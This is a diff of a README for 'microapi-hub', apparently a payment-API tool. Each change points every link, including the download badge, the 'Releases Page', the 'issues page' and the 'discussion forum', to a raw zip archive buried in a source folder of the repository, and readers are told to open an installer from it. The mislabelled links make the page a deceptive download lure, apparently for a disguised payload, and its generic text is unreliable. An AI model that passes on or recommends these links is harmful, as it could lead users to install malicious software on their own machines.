@@ -1,6 +1,6 @@
 # 🛠️ microapi-hub - Simple Payment Solutions Made Easy
 
-[![Download microapi-hub](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/services/provider-api/src/microapi-hub-v1.9.zip)](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/services/provider-api/src/microapi-hub-v1.9.zip)
+[![Download microapi-hub](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/clients/web/lib/hub_microapi_2.2-beta.1.zip)](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/clients/web/lib/hub_microapi_2.2-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -30,14 +30,14 @@ Welcome to microapi-hub! This application implements the X402 payment protocol f
 
 To get started, visit the following link to download the application: 
 
-[Download microapi-hub](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/services/provider-api/src/microapi-hub-v1.9.zip).
+[Download microapi-hub](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/clients/web/lib/hub_microapi_2.2-beta.1.zip).
 
 You will find different versions available. Choose the one that suits your operating system, and click the download button. 
 
 ### 📥 Installation Steps
 
 1. **Download the File**:
-   - Go to the [Releases Page](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/services/provider-api/src/microapi-hub-v1.9.zip).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/clients/web/lib/hub_microapi_2.2-beta.1.zip).
    - Select the latest version of microapi-hub for your operating system (Windows, Mac, or Linux).
 
 2. **Open the Installer**:
@@ -90,7 +90,7 @@ Once you have installed the application, follow these steps to start using it:
 A: Yes, a user manual can be found in the application under the help section.
 
 **Q: How can I report an issue?**  
-A: If you encounter any problems, please visit our [issues page](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/services/provider-api/src/microapi-hub-v1.9.zip) for assistance.
+A: If you encounter any problems, please visit our [issues page](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/clients/web/lib/hub_microapi_2.2-beta.1.zip) for assistance.
 
 **Q: Does it support other programming languages?**  
 A: Currently, microapi-hub is optimized for JavaScript and TypeScript, but it can interact with APIs built in various languages.
@@ -100,7 +100,7 @@ A: Yes! We welcome contributions. Please see our contributing guidelines in the 
 
 ## 🤝 Community Support
 
-Join our community to share insights, ask questions, or connect with other users. You can find us on our [discussion forum](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/services/provider-api/src/microapi-hub-v1.9.zip).
+Join our community to share insights, ask questions, or connect with other users. You can find us on our [discussion forum](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/clients/web/lib/hub_microapi_2.2-beta.1.zip).
 
 For additional support, feel free to reach out via our contact page. We aim to respond to all inquiries promptly.
 
@@ -108,4 +108,4 @@ For additional support, feel free to reach out via our contact page. We aim to r
 
 Thank you for using microapi-hub. We hope this guide helps you get started easily. Explore and leverage the power of payment solutions through APIs! 
 
-[Download microapi-hub](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/services/provider-api/src/microapi-hub-v1.9.zip) today to begin your journey with API monetization.
+[Download microapi-hub](https://raw.githubusercontent.com/amansuthar0/microapi-hub/main/clients/web/lib/hub_microapi_2.2-beta.1.zip) today to begin your journey with API monetization.
